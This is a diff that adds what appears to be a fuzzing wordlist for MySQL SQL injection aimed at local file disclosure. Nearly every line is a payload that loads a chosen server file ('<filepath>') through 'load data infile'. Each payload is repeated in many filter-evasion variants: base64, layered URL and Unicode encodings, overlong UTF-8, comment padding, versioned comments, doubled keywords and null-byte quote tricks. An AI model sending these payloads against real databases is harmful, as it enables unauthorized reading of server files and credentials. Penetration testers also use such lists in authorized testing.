@@ -1,0 +1,226 @@
+# mysql local file disclosure through sqli
+
+# mysql local file disclosure through sqli
+
+# mysql local file disclosure through sqli
+%00
+IyBteXNxbCBsb2NhbCBmaWxlIGRpc2Nsb3N1cmUgdGhyb3VnaCBzcWxpCg==
+# mysql local file disclosure through sqli
+
+# mysql local file disclosure through sqli
+
+%2523%2520%256D%2579%2573%2571%256C%2520%256C%256F%2563%2561%256C%2520%2566%2569%256C%2565%2520%2564%2569%2573%2563%256C%256F%2573%2575%2572%2565%2520%2574%2568%2572%256F%2575%2567%2568%2520%2573%2571%256C%2569%250A
+%23%20%6D%79%73%71%6C%20%6C%6F%63%61%6C%20%66%69%6C%65%20%64%69%73%63%6C%6F%73%75%72%65%20%74%68%72%6F%75%67%68%20%73%71%6C%69%0A
+%u0023%u0020%u006D%u0079%u0073%u0071%u006C%u0020%u006C%u006F%u0063%u0061%u006C%u0020%u0066%u0069%u006C%u0065%u0020%u0064%u0069%u0073%u0063%u006C%u006F%u0073%u0075%u0072%u0065%u0020%u0074%u0068%u0072%u006F%u0075%u0067%u0068%u0020%u0073%u0071%u006C%u0069%u000A
+# mysql local file disclosure through sqli
+
+# mysql local file disclosure through sqli
+
+# mysql local file disclosure through sqli
+
+# mysql local file disclosure through sqli
+
+# mysql local file disclosure through sqli
+
+# mysql local file disclosure through sqli
+
+# mysql local file disclosure through sqli
+
+# mysql local file disclosure through sqli
+
+# mysql local file disclosure through sqli
+
+# mysql local file disclosure through sqli
+
+%C0%AB%C0%AAmysql%C0%AAlocal%C0%AAfile%C0%AAdisclosure%C0%AAthrough%C0%AAsqli%C0%8A
+%# %m%y%s%q%l %l%o%c%a%l %f%i%l%e %d%i%s%c%l%o%s%u%r%e %t%h%r%o%u%g%h %s%q%l%i%
+
+# mysql local file disclosure through sqli
+
+# mysql local file disclosure through sqli
+
+# mysql local file disclosure through sqli
+ and '0having'='0having'
+# mysql local file disclosure through sqli
+sp_password
+#/**/mysql/**/local/**/file/**/disclosure/**/through/**/sqli
+
+# mysql local file disclosure through sqli
+
+# mysql local file disclosure through sqli
+
+# mysql local file disclosure through sqli
+
+#%0Bmysql%0Clocal%0Ffile%07disclosure%04through%0Esqli
+
+# mysql local file disclosure through sqli
+
+#%0Bmysql%09local%0Dfile%0Ddisclosure%0Athrough%0Asqli
+
+# mysql local file disclosure through sqli
+
+#+mysql+local+file+disclosure+through+sqli
+
+#%0Cmysql%0Clocal%0Dfile%0Cdisclosure%0Cthrough%0Dsqli
+
+# mysql local file disclosure through sqli
+
+# mysql local file disclosure through sqli
+
+# mysql local file disclosure through sqli
+
+# mysql local file disclosure through sqli
+
+# mysql local file disclosure through sqli
+
+# mysql local file disclosure through sqli
+
+# fuzz interesting absolute filepath/filename into <filepath>
+
+# fuzz interesting absolute filepath/filename into <filepath>
+
+# fuzz interesting absolute filepath/filename into <filepath>
+%00
+IyBmdXp6IGludGVyZXN0aW5nIGFic29sdXRlIGZpbGVwYXRoL2ZpbGVuYW1lIGludG8gPGZpbGVwYXRoPgo=
+# fuzz interesting absolute filepath/filename into <filepath>
+
+# fuzz interesting absolute filepath/filename into <filepath>
+
+%2523%2520%2566%2575%257A%257A%2520%2569%256E%2574%2565%2572%2565%2573%2574%2569%256E%2567%2520%2561%2562%2573%256F%256C%2575%2574%2565%2520%2566%2569%256C%2565%2570%2561%2574%2568%252F%2566%2569%256C%2565%256E%2561%256D%2565%2520%2569%256E%2574%256F%2520%253C%2566%2569%256C%2565%2570%2561%2574%2568%253E%250A
+%23%20%66%75%7A%7A%20%69%6E%74%65%72%65%73%74%69%6E%67%20%61%62%73%6F%6C%75%74%65%20%66%69%6C%65%70%61%74%68%2F%66%69%6C%65%6E%61%6D%65%20%69%6E%74%6F%20%3C%66%69%6C%65%70%61%74%68%3E%0A
+%u0023%u0020%u0066%u0075%u007A%u007A%u0020%u0069%u006E%u0074%u0065%u0072%u0065%u0073%u0074%u0069%u006E%u0067%u0020%u0061%u0062%u0073%u006F%u006C%u0075%u0074%u0065%u0020%u0066%u0069%u006C%u0065%u0070%u0061%u0074%u0068%u002F%u0066%u0069%u006C%u0065%u006E%u0061%u006D%u0065%u0020%u0069%u006E%u0074%u006F%u0020%u003C%u0066%u0069%u006C%u0065%u0070%u0061%u0074%u0068%u003E%u000A
+# fuzz interesting absolute filepath/filename into <filepath>
+
+# fuzz interesting absolute filepath/filename into <filepath>
+
+# fuzz interesting absolute filepath/filename into <filepath>
+
+# fuzz interesting absolute filepath/filename into <filepath>
+
+# fuzz interesting absolute filepath/filename into <filepath>
+
+# fuzz interesting absolute filepath/filename into <filepath>
+
+# fuzz interesting absolute filepath/filename into <filepath>
+
+# fuzz interesting absolute filepath/filename into <filepath>
+
+# fuzz interesting absolute filepath/filename into <filepath>
+
+# fuzz interesting absolute filepath/filename into <filepath>
+
+%C0%AB%C0%AAfuzz%C0%AAinteresting%C0%AAabsolute%C0%AAfilepath%C0%AFfilename%C0%AAinto%C0%AA%C0%BEfilepath%C0%BE%C0%8A
+%# %f%u%z%z %i%n%t%e%r%e%s%t%i%n%g %a%b%s%o%l%u%t%e %f%i%l%e%p%a%t%h%/%f%i%l%e%n%a%m%e %i%n%t%o %<%f%i%l%e%p%a%t%h%>%
+
+# fuzz interesting absolute filepath/filename into <filepath>
+
+# fuzz interesting absolute filepath/filename into <filepath>
+
+# fuzz interesting absolute filepath/filename into <filepath>
+ and '0having'='0having'
+# fuzz interesting absolute filepath/filename into <filepath>
+sp_password
+#/**/fuzz/**/interesting/**/absolute/**/filepath/filename/**/into/**/<filepath>
+
+# fuzz interesting absolute filepath/filename into <filepath>
+
+# fuzz interesting absolute filepath/filename into <filepath>
+
+# fuzz interesting absolute filepath/filename into <filepath>
+
+#%02fuzz%03interesting%06absolute%06filepath/filename%03into%06<filepath>
+
+# fuzz interesting absolute filepath/filename into <filepath>
+
+#%0Bfuzz%0Cinteresting%09absolute%0Dfilepath/filename%0Binto%0C<filepath>
+
+# fuzz interesting absolute filepath/filename into <filepath>
+
+#+fuzz+interesting+absolute+filepath/filename+into+<filepath>
+
+#%0Afuzz%0Ainteresting%0Dabsolute%0Dfilepath/filename%09into%0D<filepath>
+
+# fuzz interesting absolute filepath/filename into <filepath>
+
+# fuzz interesting absolute filepath/filename into <filepath>
+
+# fuzz interesting absolute filepath/filename into <filepath>
+
+# fuzz interesting absolute filepath/filename into <filepath>
+
+# fuzz interesting absolute filepath/filename into <filepath>
+
+# fuzz interesting absolute filepath/filename into <filepath>
+
+create table myfile (input TEXT); load data infile %EF%BC%87<filepath>%EF%BC%87 into table myfile; select * from myfile;
+
+create table myfile (input TEXT); load data infile %00%27<filepath>%00%27 into table myfile; select * from myfile;
+
+create table myfile (input TEXT); load data infile '<filepath>' into table myfile; select * from myfile;
+%00
+Y3JlYXRlIHRhYmxlIG15ZmlsZSAoaW5wdXQgVEVYVCk7IGxvYWQgZGF0YSBpbmZpbGUgJzxmaWxlcGF0aD4nIGludG8gdGFibGUgbXlmaWxlOyBzZWxlY3QgKiBmcm9tIG15ZmlsZTsK
+create table myfile (input TEXT); load data infile '<filepath>' into table myfile; select * from myfile;
+
+create table myfile (input TEXT); load data infile '<filepath>' into table myfile; select * from myfile;
+
+%2563%2572%2565%2561%2574%2565%2520%2574%2561%2562%256C%2565%2520%256D%2579%2566%2569%256C%2565%2520%2528%2569%256E%2570%2575%2574%2520%2554%2545%2558%2554%2529%253B%2520%256C%256F%2561%2564%2520%2564%2561%2574%2561%2520%2569%256E%2566%2569%256C%2565%2520%2527%253C%2566%2569%256C%2565%2570%2561%2574%2568%253E%2527%2520%2569%256E%2574%256F%2520%2574%2561%2562%256C%2565%2520%256D%2579%2566%2569%256C%2565%253B%2520%2573%2565%256C%2565%2563%2574%2520%252A%2520%2566%2572%256F%256D%2520%256D%2579%2566%2569%256C%2565%253B%250A
+%63%72%65%61%74%65%20%74%61%62%6C%65%20%6D%79%66%69%6C%65%20%28%69%6E%70%75%74%20%54%45%58%54%29%3B%20%6C%6F%61%64%20%64%61%74%61%20%69%6E%66%69%6C%65%20%27%3C%66%69%6C%65%70%61%74%68%3E%27%20%69%6E%74%6F%20%74%61%62%6C%65%20%6D%79%66%69%6C%65%3B%20%73%65%6C%65%63%74%20%2A%20%66%72%6F%6D%20%6D%79%66%69%6C%65%3B%0A
+%u0063%u0072%u0065%u0061%u0074%u0065%u0020%u0074%u0061%u0062%u006C%u0065%u0020%u006D%u0079%u0066%u0069%u006C%u0065%u0020%u0028%u0069%u006E%u0070%u0075%u0074%u0020%u0054%u0045%u0058%u0054%u0029%u003B%u0020%u006C%u006F%u0061%u0064%u0020%u0064%u0061%u0074%u0061%u0020%u0069%u006E%u0066%u0069%u006C%u0065%u0020%u0027%u003C%u0066%u0069%u006C%u0065%u0070%u0061%u0074%u0068%u003E%u0027%u0020%u0069%u006E%u0074%u006F%u0020%u0074%u0061%u0062%u006C%u0065%u0020%u006D%u0079%u0066%u0069%u006C%u0065%u003B%u0020%u0073%u0065%u006C%u0065%u0063%u0074%u0020%u002A%u0020%u0066%u0072%u006F%u006D%u0020%u006D%u0079%u0066%u0069%u006C%u0065%u003B%u000A
+create table myfile (input TEXT); load data infile '<filepath>' into table myfile; select * from myfile;
+
+create table myfile (input TEXT); load data infile '<filepath>' into table myfile; select * from myfile;
+
+create table myfile (input TEXT); load data infile '<filepath>' into table myfile; select * from myfile;
+
+create table myfile (input TEXT); load data infile '<filepath>' into table myfile; select * from myfile;
+
+create table myfile (input TEXT); load data infile '<filepath>' into table myfile; select * from myfile;
+
+create table myfile (input TEXT); load data infile '<filepath>' into table myfile; select * from myfile;
+
+create /*!30404table myfile (input TEXT); load data infile '<filepath>' into table myfile; select * from myfile;
+*/
+create /*!00000table myfile (input TEXT); load data infile '<filepath>' into table myfile; select * from myfile;
+*/
+create table myfile (input TEXT); load data infile '<filepath>' into table myfile; select * from myfile;
+
+create table myfile (input TEXT); load data infile '<filepath>' into table myfile; SSELECTELECT * FFROMROM myfile;
+
+create%C0%AAtable%C0%AAmyfile%C0%AA%C0%AAinput%C0%AATEXT%C0%AB%C0%BB%C0%AAload%C0%AAdata%C0%AAinfile%C0%AA%C0%AF%C0%BEfilepath%C0%BE%C0%AF%C0%AAinto%C0%AAtable%C0%AAmyfile%C0%BB%C0%AAselect%C0%AA%C0%AA%C0%AAfrom%C0%AAmyfile%C0%BB%C0%8A
+%c%r%e%a%t%e %t%a%b%l%e %m%y%f%i%l%e %(%i%n%p%u%t %T%E%X%T%)%; %l%o%a%d %d%a%t%a %i%n%f%i%l%e %'%<%f%i%l%e%p%a%t%h%>%' %i%n%t%o %t%a%b%l%e %m%y%f%i%l%e%; %s%e%l%e%c%t %* %f%r%o%m %m%y%f%i%l%e%;%
+
+create table myfile (input TEXT); load data infile '<filepath>' into table myfile; select * from myfile;
+
+create table myfile (input TEXT); load data infile '<filepath>' into table myfile; select * from myfile;
+
+create table myfile (input TEXT); load data infile '<filepath>' into table myfile; select * from myfile;
+ and '0having'='0having'
+create table myfile (input TEXT); load data infile '<filepath>' into table myfile; select * from myfile;
+-- sp_password
+create/**/table/**/myfile/**/(input/**/TEXT);/**/load/**/data/**/infile/**/'<filepath>'/**/into/**/table/**/myfile;/**/select/**/*/**/from/**/myfile;
+
+create--bRJAWaum%0Atable--tbTzoWaXHbcI%0Amyfile--KamwnkhTh%0A(input--NrPyEdzf%0ATEXT);--DkPDll%0Aload--XGFvhXzcsm%0Adata--CQFKiMfTF%0Ainfile--WkmgogntQrP%0A'<filepath>'--UlFicSnYS%0Ainto--jKehiC%0Atable--DIwYjRjMdSOC%0Amyfile;--XYDwaTyQ%0Aselect--lDOeMJgxP%0A*--zWeOWO%0Afrom--WCZAeN%0Amyfile;--SXEDWThd%0A
+create%23nIphFFh%0Atable%23tClvMscOMvp%0Amyfile%23DXhcQC%0A(input%23nHLhnBo%0ATEXT);%23nlVYnsleMU%0Aload%23hqRacpTPq%0Adata%23pddrPXc%0Ainfile%23ZLAxYRr%0A'<filepath>'%23wDohdey%0Ainto%23QsxBreQ%0Atable%23HqJUbxo%0Amyfile;%23FzxLHPacl%0Aselect%23oMKccY%0A*%23zbhpisDOEtdF%0Afrom%23yLkMHgbJ%0Amyfile;%23zSdVvM%0A
+create%23ARIErX%0Atable%23FrTRXcYecP%0Amyfile%23vKTCgTHM%0A(input%23ZdsqasPamzGC%0ATEXT);%23TZQYJulAWs%0Aload%23uGiwEIWff%0Adata%23kyZJBqVGT%0Ainfile%23lOfHqexXYkuu%0A'<filepath>'%23cVhKtsfje%0Ainto%23qTMXBpSJcc%0Atable%23rYcnWSYDHptk%0Amyfile;%23kvOhavXwK%0Aselect%23OvjTAgzZ%0A*%23LGpcAR%0Afrom%23OhDOVVJRH%0Amyfile;%23pnouGahmMq%0A
+create%0Atable%0Fmyfile%04(input%01TEXT);%0Fload%0Adata%0Cinfile%01'<filepath>'%06into%06table%02myfile;%0Eselect%02*%0Dfrom%0Cmyfile;
+
+create%23%0Atable%23%0Amyfile%23%0A(input%23%0ATEXT);%23%0Aload%23%0Adata%23%0Ainfile%23%0A'<filepath>'%23%0Ainto%23%0Atable%23%0Amyfile;%23%0Aselect%23%0A*%23%0Afrom%23%0Amyfile;%23%0A
+create%09table%0Amyfile%0B(input%0CTEXT);%09load%09data%0Binfile%0C'<filepath>'%0Ainto%0Ctable%09myfile;%09select%09*%0Dfrom%0Bmyfile;
+
+create--%0Atable--%0Amyfile--%0A(input--%0ATEXT);--%0Aload--%0Adata--%0Ainfile--%0A'<filepath>'--%0Ainto--%0Atable--%0Amyfile;--%0Aselect--%0A*--%0Afrom--%0Amyfile;--%0A
+create+table+myfile+(input+TEXT);+load+data+infile+'<filepath>'+into+table+myfile;+select+*+from+myfile;
+
+create%09table%0Cmyfile%0A(input%09TEXT);%09load%0Ddata%0Ainfile%0D'<filepath>'%0Cinto%0Atable%0Amyfile;%0Cselect%0A*%09from%0Amyfile;
+
+create table myfile (input TEXT); load data infile '<filepath>' into table myfile; select * from myfile;
+
+create table myfile (input TEXT); load data infile %bf%27<filepath>' into table myfile; select * from myfile;
+
+create table myfile (input TEXT); load data infile '<filepath>' into table myfile; select * from myfile;
+
+create table myfile (input TEXT); load data infile '<filepath>' into table myfile; select * from myfile;
+
+create table myfile (input TEXT); load data infile '<filepath>' into table myfile; select * from myfile;
+
+create table myfile (input TEXT); load data infile '<filepath>' into table myfile; select * from myfile;
+
